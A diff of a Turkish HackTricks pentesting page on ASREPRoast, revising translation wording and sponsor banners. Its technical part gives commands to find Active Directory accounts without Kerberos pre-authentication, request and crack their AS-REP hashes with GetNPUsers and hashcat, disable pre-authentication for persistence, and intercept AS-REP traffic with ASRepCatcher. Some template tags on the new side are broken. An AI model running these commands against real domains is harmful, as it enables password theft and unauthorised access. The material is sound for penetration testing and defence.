@@ -2,19 +2,19 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
-* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek katkıda bulunun.
+* **Katılın** 💬 [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
+* **Hacking püf noktalarınızı paylaşarak katkıda bulunun** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
 Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!
 
@@ -22,40 +22,38 @@ Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenPro
 Hackleme heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin
 
 **Gerçek Zamanlı Hack Haberleri**\
-Hızlı tempolu hackleme dünyasını gerçek zamanlı haberler ve içgörülerle takip edin
+Hızlı tempolu hackleme dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın
 
 **En Son Duyurular**\
 Yeni ödül avı başlatmaları ve önemli platform güncellemeleri hakkında bilgilenin
 
-**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katılın ve bugün en iyi hackerlarla işbirliğine başlayın!**
+**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!
 
 ## ASREPRoast
 
-ASREPRoast, **Kerberos ön kimlik doğrulaması gereken öznitelik** eksikliği olan kullanıcıları hedef alan bir güvenlik saldırısıdır. Temelde, bu zafiyet saldırganlara, kullanıcının şifresine ihtiyaç duymadan Birim Denetleyicisi'nden (DC) bir kullanıcı için kimlik doğrulaması isteme imkanı sağlar. DC daha sonra, saldırganların kullanıcının şifresini keşfetmek için çevrimdışı olarak kırmaya çalışabilecekleri kullanıcının şifresinden türetilmiş anahtarla şifrelenmiş bir ileti ile yanıt verir.
+ASREPRoast, **Kerberos ön kimlik doğrulaması gereken özelliğe sahip olmayan kullanıcıları** hedef alan bir güvenlik saldırısıdır. Temelde, bu zafiyet saldırganlara, kullanıcının şifresine ihtiyaç duymadan Bir Alan Denetleyicisinden (DC) bir kullanıcı için kimlik doğrulaması isteme imkanı sağlar. DC daha sonra, saldırganların kullanıcının şifresini keşfetmek için çevrimdışı olarak kırmaya çalışabilecekleri kullanıcının şifresinden türetilmiş anahtarla şifrelenmiş bir ileti ile yanıt verir.
 
 Bu saldırı için ana gereksinimler şunlardır:
 
 * **Kerberos ön kimlik doğrulamasının eksikliği**: Hedef kullanıcıların bu güvenlik özelliğine sahip olmaması gerekir.
-* **Birim Denetleyicisi'ne (DC) bağlantı**: Saldırganların istek göndermek ve şifrelenmiş iletileri almak için DC'ye erişime ihtiyacı vardır.
-* **İsteğe bağlı etki alanı hesabı**: Bir etki alanı hesabına sahip olmak, saldırganların LDAP sorguları aracılığıyla daha verimli bir şekilde savunmasız kullanıcıları tanımlamalarına olanak tanır. Böyle bir hesaba sahip olmayan saldırganlar, kullanıcı adlarını tahmin etmelidir. 
+* **Alan Denetleyicisine (DC) bağlantı**: Saldırganların istek göndermek ve şifreli iletileri almak için DC'ye erişime ihtiyacı vardır.
+* **İsteğe bağlı alan hesabı**: Bir alan hesabına sahip olmak, saldırganların LDAP sorguları aracılığıyla daha verimli bir şekilde savunmasız kullanıcıları tanımlamalarına olanak tanır. Böyle bir hesaba sahip olmayan saldırganlar, kullanıcı adlarını tahmin etmek zorundadır.
 
-#### Savunmasız kullanıcıları sıralama (etki alanı kimlik bilgilerine ihtiyaç duyar)
+#### Savunmasız kullanıcıları sıralama (alan kimlik bilgilerine ihtiyaç duyar)
 
-{% code title="Windows Kullanarak" %}
+{% code title="Windows Kullanarak"}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
 {% endcode %}
 
-{% code title="Linux Kullanarak" %}
+{% code title="Linux Kullanımı" %}
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-{% endcode %}
+#### AS\_REP mesajı isteği
 
-#### AS\_REP mesajını iste
-
-{% code title="Linux kullanarak" %}
+{% code title="Linux Kullanarak" %}
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -82,7 +80,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Kalıcılık
 
-**GenericAll** izinlerine sahip olduğunuz bir kullanıcı için **preauth** zorunlu değilse (veya özellikler yazma izinleriniz varsa):
+**GenericAll** izinlerine sahip olduğunuz bir kullanıcı için **preauth** zorunlu değilse (veya özellikler yazma izinlerine sahipseniz):
 
 {% code title="Windows Kullanarak" %}
 ```bash
@@ -90,14 +88,14 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```
 {% endcode %}
 
-{% code title="Linux Kullanarak" %}
+{% code title="Linux Kullanımı" %}
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
 ## Kimlik bilgileri olmadan ASREProast
 
-Bir saldırgan, Kerberos ön kimliğinin devre dışı bırakılmış olmasına güvenmeden ağ üzerinde dolaşan AS-REP paketlerini yakalamak için bir adam ortasında konumlanabilir. Bu nedenle, bu yöntem VLAN'daki tüm kullanıcılar için çalışır.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bize bunu yapma imkanı tanır. Ayrıca, araç, Kerberos müzakeresini değiştirerek istemci iş istasyonlarının RC4'ü kullanmasını zorlar.
+Bir saldırgan, Kerberos ön kimliğin devre dışı bırakılmış olmasına güvenmeden ağ üzerinde dolaşırken AS-REP paketlerini yakalamak için bir adam ortasında konumlanabilir. Bu nedenle, bu yöntem VLAN'daki tüm kullanıcılar için çalışır.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bize bunu yapma imkanı tanır. Dahası, araç, Kerberos müzakeresini değiştirerek istemci iş istasyonlarının RC4'ü kullanmasını zorlar.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -114,18 +112,18 @@ ASRepCatcher listen
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın ve deneyimli hackerlar ve ödül avcıları ile iletişim kurun!
 
-**Hacking İçgörüleri**\
-Hacking'in heyecanını ve zorluklarını inceleyen içeriklerle etkileşime geçin
+**Hacking Insights**\
+Hacking'in heyecanına ve zorluklarına inen içeriklerle etkileşime girin
 
 **Gerçek Zamanlı Hack Haberleri**\
-Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin
+Hızlı tempolu hacking dünyasında gerçek zamanlı haberler ve içgörülerle güncel kalın
 
 **En Son Duyurular**\
-Yayınlanan en yeni ödül avcılıkları ve önemli platform güncellemeleri hakkında bilgi edinin
+Yeni ödül avı başlatmaları ve önemli platform güncellemeleri hakkında bilgilenin
 
 **Bize Katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliğine başlayın!
 
@@ -135,7 +133,7 @@ Yayınlanan en yeni ödül avcılıkları ve önemli platform güncellemeleri ha
 
 HackTricks'i desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
